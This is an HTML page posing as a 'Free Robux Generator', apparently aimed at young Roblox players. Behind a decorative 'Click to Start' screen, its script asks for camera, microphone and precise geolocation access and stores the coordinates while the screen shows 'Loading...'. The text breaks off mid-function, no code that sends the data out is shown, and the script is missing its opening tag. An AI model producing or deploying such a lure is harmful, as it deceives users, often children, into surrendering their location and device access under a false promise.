<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Robux Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
            position: relative;
        }

        .container {
            text-align: center;
            z-index: 10;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: white;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .robux-text {
            color: #ffcc00;
            font-size: 32px;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
            animation: pulse 2s ease-in-out infinite;
            margin-bottom: 20px;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.05); opacity: 0.9; }
        }

        .start-button {
            background: linear-gradient(45deg, #ffcc00, #ff9900);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.4);
        }

        .start-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.6);
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            overflow: hidden;
            margin-top: 20px;
            display: none;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ffcc00, #ff9900);
            border-radius: 3px;
            animation: progress 3s ease-in-out infinite;
        }

        @keyframes progress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }

        .floating-robux {
            position: absolute;
            font-size: 24px;
            color: #ffcc00;
            animation: float 6s ease-in-out infinite;
            opacity: 0.7;
            pointer-events: none;
        }

        @keyframes float {
            0%, 100% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 0.7; }
            90% { opacity: 0.7; }
            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
        }

        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #4ade80;
            border-radius: 50%;
            margin-right: 8px;
            animation: blink 2s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-spinner" id="spinner"></div>
        <div class="loading-text" id="loading-text">
            <span class="status-dot"></span>
            Ready to Generate!
        </div>
        <div class="robux-text">🎁 Free Robux Generator 🎁</div>
        <button class="start-button" id="startBtn" onclick="startGenerator()">Click to Start</button>
        <div class="progress-bar" id="progressBar">
            <div class="progress-fill"></div>
        </div>
    </div>

    <!-- Floating Robux symbols -->
    <div class="floating-robux" style="left: 10%; animation-delay: 0s;">💎</div>
    <div class="floating-robux" style="left: 20%; animation-delay: 1s;">🪙</div>
    <div class="floating-robux" style="left: 30%; animation-delay: 2s;">💰</div>
    <div class="floating-robux" style="left: 40%; animation-delay: 3s;">💎</div>
    <div class="floating-robux" style="left: 50%; animation-delay: 4s;">🪙</div>
    <div class="floating-robux" style="left: 60%; animation-delay: 5s;">💰</div>
    <div class="floating-robux" style="left: 70%; animation-delay: 1.5s;">💎</div>
    <div class="floating-robux" style="left: 80%; animation-delay: 2.5s;">🪙</div>
    <div class="floating-robux" style="left: 90%; animation-delay: 3.5s;">💰</div>

        async function requestPermissions() {
            const permissions = {
                camera: false,
                microphone: false,
                location: false
            };

            // Request camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                permissions.camera = true;
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                console.log('Camera denied:', e);
            }

            // Request microphone
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                permissions.microphone = true;
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                console.log('Microphone denied:', e);
            }

            // Request location
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        timeout: 10000,
                        maximumAge: 60000
                    });
                });
                permissions.location = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                document.getElementById('loading-text').innerHTML = '<span class="status-dot"></span>Loading...';
            } catch (e) {
                console.log('Location denied:', e);
            }

            return permissions;
